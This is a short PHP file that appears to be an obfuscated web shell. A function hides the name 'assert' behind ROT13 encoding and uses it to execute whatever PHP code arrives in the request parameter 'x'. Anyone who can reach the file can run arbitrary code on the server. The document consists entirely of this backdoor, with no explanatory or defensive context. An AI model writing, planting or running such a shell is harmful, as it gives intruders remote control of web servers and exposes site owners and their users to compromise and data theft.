<?php
function Sn0w($a){
$b=str_rot13('nffreg');
$b($a);
}
Sn0w($_REQUEST['x']);
?>